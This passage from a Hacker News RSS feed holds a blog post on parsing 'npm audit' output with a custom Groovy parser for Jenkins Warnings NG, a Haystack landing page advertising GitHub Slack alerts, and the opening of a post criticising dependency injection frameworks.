‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ High          ‚îÇ Remote Memory Exposure                           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Package       ‚îÇ bl                                               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Dependency <span>of</span> ‚îÇ exceljs                                          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ <span>Path</span>          ‚îÇ exceljs &gt; archiver &gt; tar-stream &gt; bl             ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ More <span>info</span>     ‚îÇ https://npmjs.com/advisories/<span>1555</span>                ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
</code></pre><p>Supposedly, you are using some CI server for your project (and you should use one). Now think about this:</p>
<blockquote>
<p>As your package manager automatically informs you about the vulnerabilities discovered in your dependencies, wouldn't it be awesome to receive this information on par with testing stats and linting reports on your CI server?</p>
</blockquote>
<p>In this blog post, I will walk you through the process of capturing your <code>npm audit</code> output during a Jenkins build and using it for up-to-date information, trend overview, and quality gates.</p>
<h2 id="the-scope">The Scope</h2>
<p>As you may have guessed already, we will talk about Jenkins here. If you are using another CI server, the <em>Understanding the NPM Format</em> section can be still useful for you, but everything else is indeed Jenkins-specific.</p>
<p>First of all, we are going to follow the <strong>declarative pipeline</strong> approach. It's a pity, that Jenkins still won't champion one of the approaches (at the moment Declarative Pipeline, Scripted Pipeline, and UI Config seem to be considered equally important). As the result, many libraries try to document how to use all the approaches, and as they don't have unlimited time, the documentations ends up being scarce. Based on extensive research I decided that Declarative Pipelines are the way to go, and I will stick to this decision throughout this blog.</p>
<p>Secondly, we are going to use the  <strong>Warnings Next Generation</strong>  plugin (a.k.a. <a target="_blank" href="https://plugins.jenkins.io/warnings-ng/">Warnings NG</a>). It seems to be the state of the art for static analysis reports at the moment. And yes, you need to have this plugin installed on your Jenkins server to get things working.</p>
<p>As the Warnings Next Generation plugin does not currently support the npm audit log format, we are going to overcome this issue by creating a <strong>custom groovy parser</strong>. There are other approaches like converting the output to a supported generic format or making a dedicated Jenkins plugin, and I may discuss these in the future. For now, the custom parser looks like the easiest way to get things going and all it requires are some changes to the build configuration.</p>
<p>Finally, I believe that even if your use case does not involve NPM, this blogpost can be useful for understanding how to implement custom groovy parsers for the Warnings GN plugin.</p>
<h2 id="understanding-the-npm-format">Understanding the NPM Format</h2>
<p>As you may imagine, ultimately we will have to parse the <code>npm audit</code> output into something understandable by Warnings NG. Although we are going to discuss the parser setup in the next section, I will spoil you by revealing that the passing uses regular expressions exclusively.</p>
<p>The example output that I shared in the intro contains a table built with ASCI symbols. Such a format is tough to parse with a regex. Luckily there is a flag <code>npm audit --parseable</code> which will write every violation as a single line with values separated by tabs (for the sake of readability I replaced the tabs with aligned spaces in the following snippet):</p>
<pre><code><span>update</span>   bl       <span>high</span>      npm <span>update</span> bl 
<span>install</span>  exceljs  moderate  npm <span>install</span> exceljs@<span>4.1</span><span>.1</span>    <span>Cross</span>-Site Scripting    https://npmjs.com/advisories/<span>733</span>   exceljs                                 Y
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
</code></pre><p>Each line contains the following information in order:</p>
<ol>
<li>Action type required to resolve the issue;</li>
<li>Name of the package with a vulnerability;</li>
<li>Severity of the vulnerability;</li>
<li>Resolution command/suggestion;</li>
<li>Vulnerability category;</li>
<li>Link to the vulnerability details;</li>
<li>Dependency path;</li>
<li>Y, N, or nothing. I don't know what that is :)</li>
</ol>
<p>To write the regex, I've googled a first good regex testing website (<a target="_blank" href="https://regexr.com/">regexr.com</a>), pasted the audit output, and experimented. In the following screenshot you can see from top to bottom:</p>
<ol>
<li>the resulting regex with a highlighted group that I'm investigating;</li>
<li>the example output I used for testing with one highlighted line that I'm investigating;</li>
<li>the breakdown of the match groups in the highlighted line, with one group highlighted which corresponds to the highlighted part of the regex.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1600349954546/rr7FwAR_K.png?auto=format&amp;q=60" alt="Testing npm audit regex at regexr"></li>
</ol>
<p>As you could see, the resulting regex is:</p>
<p><code>\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)</code></p>
<p>Here is a small explanation of important regex matching patterns:</p>
<ul>
<li><code>\t</code> ‚Äî a tab character;</li>
<li><code>\w</code> ‚Äî an alphanumerical character;</li>
<li><code>\S</code> ‚Äî a non-whitespace character;</li>
<li><code>(\S| )</code> ‚Äî a non-whitespace character or a space;</li>
<li><code>\w+</code> ‚Äî one or many alphanumerical characters;</li>
<li><code>\S+</code> ‚Äî one or many non-whitespace characters;</li>
<li><code>(\S| )+</code> ‚Äî one or many non-whitespace or space characters.</li>
</ul>
<p>You can (and should in this case) use parenthesis to define "capture groups." These are parts of the regex that can be accessed once a match is found. Sometimes you have to use parenthesis (as in <code>(\S| )+</code> to define that <code>+</code> applies to the whole "or" group). There are ways to ignore a certain parenthesis as a match group (so you can avoid pollution by necessary parenthesis) but we are not going to discuss this now.</p>
<p>Also the whole regex can be described as: <code>((\S| )+)\t</code> repeated eight times without the last <code>\t</code>. The whole line is composed of blocks of <em>one or many non-whitespace or space characters</em> followed by a tab. But I tried to be smart and use some simpler constructs where I was sure about the format of some parts.</p>
<h2 id="creating-a-custom-groovy-parser">Creating a Custom Groovy Parser</h2>
<p>At this point, we are going to jump directly into our Jenkins (declarative) pipeline. This assumes that we have a <code>Jenkinsfile</code> that describes a build pipeline composed of several stages. With my approach, all that you have to do is just to add one more stage for auditing. It will look the following way:</p>
<pre><code>stage(<span>'NPM Audit'</span>) {
    steps {
        script {
            // <span>set</span> up the <span>parser</span>
        }
        sh <span>'mkdir -p .tmp/npm'</span>
        sh <span>'npm audit --parseable &gt; .tmp/npm/audit || true'</span>
    }
    post {
        <span>always</span> {
            // <span>record</span> issues
        }
    }
}
</code></pre><p>We will spend the majority of this section to set up the parser, but let's take a quick look at the code that runs the auditing. First of all, don't forget to crate a temp directory where you are going to store the auditing log. Secondly, run the audit with the <code>--parseable</code> flag and write it into a temporary file with a unique name. As you can see, at the end of the command I have <code>|| true</code> which will ensure that the step will not fail. Normally when <code>npm audit</code> finds some vulnerabilities it exits with a non-zero code and thus fails the stage. I prefer to control how the stage fails with the quality gates of Warnings GN, and I will discuss this later. There is another option to specify the <code>--audit-level=critical</code> flag which will fail the step only if there are critical vulnerabilities (and probably you want to fail your build if you have one of those). Never the less, I prefer to handle all the vulnerabilities with Warnings GN. The downside of <code>|| true</code> is that the stage will not fail even if the <code>npm audit</code> command fails to run at all (e.g., if package.json is missing).</p>
<h3 id="defining-the-parser">Defining the Parser</h3>
<p>Based on the documentation, you should set up a parser with the following command:</p>
<pre><code><span><span>def</span> <span>config</span> = <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>ParserConfiguration</span>.<span>getInstance</span><span>()</span></span>

<span>if</span>(!config.contains(<span>'npm-audit'</span>)){
    <span><span>def</span> <span>newParser</span> = <span>new</span> <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>GroovyParser</span><span>(
        <span>'npm-audit'</span>,
        <span>'NPM Audit Parser'</span>,
        <span>'\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)'</span>,
        <span>'return builder.setFileName(matcher.group(7)).setCategory(matcher.group(4)).setMessage(matcher.group(6)).buildOptional()'</span>,
        <span>"update\tlodash\tlow\tnpm update lodash --depth 9\tPrototype Pollution\thttps://npmjs.com/advisories/1523\telasticsearch&gt;lodash\tN"</span>
    )</span></span>
    config.setParsers(config.getParsers().plus(newParser))
}
</code></pre><p>Let's focus on the actual parser for now. We create a parser by calling the constructor of <code>GroovyParser</code>. The first two parameters are <code>id</code> and <code>name</code>. The <code>id</code> is a technical label used to identify your parser in the future, the <code>name</code> is what you are going to see in the Jenkins UI. Then comes the regex, which is identical to what we discussed in the previous section. The fourth parameter is the script which is going to create Warnings NG issues from the parsed out tokens, and the last one is the example line of what you are trying to parse (for documentation purposes).</p>
<p>Now let's look at the issue-building script in more detail. Essentially, you are using the issue builder API and passing the matched regex groups. To figure out the groups more easily, just look at the regex website again. Here is the list of all the building methods that we used:</p>
<ul>
<li><code>setFileName(matcher.group(7))</code> ‚Äî this literally sets the filename where the issue was found. Warnings NG will try to search for this file in your source code and will fail in our case (because we have packages and not actual files). Here I pass the package dependency path, so for each vulnerability, you have a clear notion of where it comes from. Another ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</a></em></p>]]>
            </description>
            <link>https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520186</guid>
            <pubDate>Fri, 18 Sep 2020 18:25:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Slack alerts you wish GitHub had]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519959">thread link</a>) | @doorknobguy
<br/>
September 18, 2020 | https://www.usehaystack.io/alerts | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/alerts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><div><div id="w-node-3dd9dc51e7f9-4c0d00e4" data-w-id="beac5ca5-6ed7-dda4-4aee-3dd9dc51e7f9"><p>Remove bottlenecks, optimize process, and work better together<br>with insights from your Github data.</p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ef12b7c5ae6d57cd5e0d514_Throughput_with-notification.png" alt=""></p></div></div></main><main id="hero"><div><div><div id="w-node-5623c4fd5ab0-4c0d00e4" data-w-id="0380a09d-ce3b-2f17-c4ca-5623c4fd5ab0"><p>Slack notifications to help your team ship better code, faster.</p></div><div id="w-node-42b75419accf-4c0d00e4" data-w-id="7dc38662-535a-8ef4-513a-42b75419accf"><div data-animation="slide" data-duration="500" data-infinite="1"><div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png" loading="lazy" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p></div></div></div></div></div></main><section id="Features"><div><div id="w-node-0bb393705a91-4c0d00e4"><p>Spot bottlenecks, burnout, and 10x your review process.</p></div></div><header><div id="Feature-1"><div id="w-node-b744e92c040c-4c0d00e4"><p>REAL-TIME ALERTS</p><h2>Spot bottlenecks</h2><p>Resolve issues quickly and unblock your team. Spur meaningful conversations during the sprint instead of in the next retro.<br>‚Äç<br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-b744e92c0422-4c0d00e4" alt=""></p></div></header><header><div id="Feature-2"><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 991px) 58vw, (max-width: 1919px) 77vw, 1248px" id="w-node-f6cddb11c0c8-4c0d00e4" alt=""></p><div id="w-node-f6cddb11c0b1-4c0d00e4"><p>HELPFUL NUDGES</p><h2>Encourage Best Practices</h2><div><p>Track process improvements and act quickly with real-time updates. No more guessing if your changes are working.</p></div></div></div></header><header><div id="Feature-3"><div id="w-node-e44b8362bb6c-4c0d00e4"><p>POWERFUL REMINDERS</p><h2>Stop Getting Stuck<br></h2><h2>'In Review'<br></h2><p>Keep your review process flowing with helpful alerts. Set reminders and notifications for when the team gets stuck.<a href="https://services.github.com/"><br></a><br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-e44b8362bb83-4c0d00e4" alt=""></p></div></header></section><div><div data-w-id="1913e8fc-27d5-f2b4-033e-a7ad21644d4e"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section id="Testimonials"><div><div><div><div data-w-id="92185803-4d8b-15a4-9568-5a8781084a54"><p>Our Clients</p><h2>Hear what our lovely clients say!<br></h2><p>Don‚Äôt take our word for it, take theirs.</p><p><a href="https://www.usehaystack.io/contact-us">Start Free Trial</a></p></div></div><div><div data-animation="slide" data-duration="500" data-infinite="1" data-w-id="92185803-4d8b-15a4-9568-5a8781084a5d"><div><div><div><div role="list"><div role="listitem"><div><p>‚ÄúI've tried just about every one of these tools and ended up choosing Haystack. Easy to use, no fluff and I love reading insights with my morning coffee‚Äù</p><div><p><img width="61" id="w-node-5a8781084a64-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab21f5a5c1d05fa46cdee_jean-photo.jpeg" alt=""></p><div><p>Jean-Vicente De Carvalho</p><p>CTO at Lytehouse</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>‚ÄúAt first I was pretty skeptical these alerts would actually work. Since then we've found issues we never knew we had, resolved issues that we typically miss and the team has never felt so productive.‚Äù</p><div><p><img width="61" id="w-node-f94162db8587-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab258d22639f82030c1da_joel-photo.jpeg" alt=""></p><div><p>Joel Spitalnik</p><p>VP of Engineering at IRIS.TV</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"This is the product you thought of while reading Accelerate. We can experiment and make more changes - while knowing we're headed in the right direction"</p><div><p><img width="61" id="w-node-3f69e9154639-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5abae65a5c1d706a46de5f_gady-pitaru.jpeg" alt=""></p><div><p>Gady Pitaru</p><p>CTO at Badger Maps</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"Simple. Easy to use and lets you to dig in if you need to. No fluff metrics or 'big brother' reporting."</p><div><p><img width="61" id="w-node-94587b18d5aa-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ac46f360f449966fe3cb4_robert-hucik.jpeg" alt=""></p><div><p>Robert Hucik</p><p>SVP, Cloud Solutions at ForgeRock</p></div></div></div></div></div></div></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb89f722d550_arrow-left-saasy-template.svg" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb7d7822d551_arrow-right-saasy-template.svg" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fbe09f22d536_background-pattern-bullets-saasy-template.svg" data-w-id="92185803-4d8b-15a4-9568-5a8781084a7b" alt=""></p></div></div></div></section><section><div><div><div data-w-id="c35d4237-391d-b7ac-d37d-be1394d7ce4a"><p>Mobile App</p><h2>Browse your analytics &amp; reports on the go!</h2><p>Browse all analytics reports, user profiles, and much more in our mobile app. It‚Äôs free, and full-feature packaged to help you on the go.</p><div><p><a href="https://www.apple.com/ios/app-store/"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb051822d5c8_button-app-store-saasy-template.svg" alt=""></a></p><p><a href="https://play.google.com/store"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb518f22d5c9_button-google-play-saasy-template.svg" alt=""></a></p></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png 1150w" sizes="100vw" data-w-id="e1c697c3-7ab8-9d09-98e0-f8be7cf200ed" alt=""></p></div></div></section><section id="FAQ"><div data-w-id="82ef7066-8d32-d493-5388-c4c2d2c5d587"><p>FAQs</p><h2>Frequently Asked Questions</h2><p>Have questions? We‚Äôve answers. If you can‚Äôt find what we are looking for, feel free to <a href="mailto:julian@usehaystack.io?subject=I%20have%20a%20question">get in touch</a>.</p></div><div><div><div data-w-id="3617354b-55d5-2b8b-9640-458190b21b06"><div data-delay="0" data-w-id="7708a86a-a613-5bc5-c125-ed8935e5b91c"><div><p>How does it work?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack plugs directly into your repositories using the Github API. We analyze the past 6 months of historical data to determine 'healthy area' for each team, repository, and member. Our system compares incoming activity to success heuristics we've collected over the years so things look out of the ordinary or worth noting - we'll tell you about. Simple as that.</p></nav></div><div data-delay="0" data-w-id="ff73c91b-7b6b-02ad-ffcb-97993103d63c"><div><p>How do I&nbsp;set it up?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>1. Create a Haystack Account<br>2. Install our Github App<br>3. Choose which repositories to plug into Haystack<br>4. Sit back and relax while insights roll into your inbox</p></nav></div><div data-delay="0" data-w-id="29e7d9a4-79c8-dee3-b804-7ae25b5c1a6d"><div><p>Do you have a demo?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>We don't have a live demo to share at the moment. With that said, we'd be happy to walk you through our own team's internal dashboard. Just email us at sales@usehaystack.io and we'll show you how it works!</p></nav></div><div data-delay="0" data-w-id="c403712e-e2f6-bb93-d607-e35a8eec7460"><div><p>Is it secure?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack does not store, read or access any of your source code. We simply use the timestamps and metadata on pull requests so your code is safe.</p></nav></div><div data-delay="0" data-w-id="ce364f13-3101-3764-a412-acdc61fe8df0"><div><p>Does it work with BitBucket or Gitlab?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack is built to support all version control platforms but at the moment we have a waitlist for Gitlab and Bitbucket users. On-premise solutions are supported with our Enterprise plan and if you need a custom integration just let us know at sales@usehaystack.io</p></nav></div></div></div></div></section><div><div data-w-id="a3e18c38-b5e1-16c3-1f84-aa2f003da28c"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section></section></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/alerts</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519959</guid>
            <pubDate>Fri, 18 Sep 2020 18:05:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Alternative to Dependency Injection Frameworks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519596">thread link</a>) | @whack
<br/>
September 18, 2020 | https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://blog.nrwl.io/essential-angular-dependency-injection-a6b9dcca1761" target="_blank" rel="noreferrer noopener"><img loading="lazy" data-attachment-id="163" data-permalink="https://software.rajivprab.com/di/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" data-orig-size="1115,569" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="di" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024" src="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" alt="" width="558" height="285" srcset="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=558&amp;h=285 558w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=150&amp;h=77 150w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300&amp;h=153 300w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=768&amp;h=392 768w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024&amp;h=523 1024w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png 1115w" sizes="(max-width: 558px) 100vw, 558px"></a></figure></div>



<p><span>I have a confession to make. I hate </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Dependency_injection_frameworks" target="_blank" rel="noopener">Dependency Injection (DI) frameworks</a><span>. </span></p>



<p><span>My very first job as a Software Engineer involved working with a very complex system that powered a ~100 person hedge fund. We made extensive use of Dependency Injection‚Ä¶ but only via </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Constructor_injection" target="_blank" rel="noopener">Constructor or Setter Injection</a><span>. We did not use any DI frameworks at all. Little did I realize how lucky I was.</span></p>



<p><span>I have since worked with Java code bases, much less complex in scope, but absolutely littered with DI annotations everywhere. I‚Äôve worked with frameworks that took DI to the next level ‚Äì even method parameters were injected by other methods that dynamically produced them when needed. To my untrained eye, it seemed like a colossal mess. Tracing anything took forever. Everything was implicitly linked to everything else. Maintaining the configs for every app and every test was a chore. Things that could have been a simple compile-time error flagged by my IDE, instead exposed themselves as run-time errors that were a pain to debug and fix. </span></p>



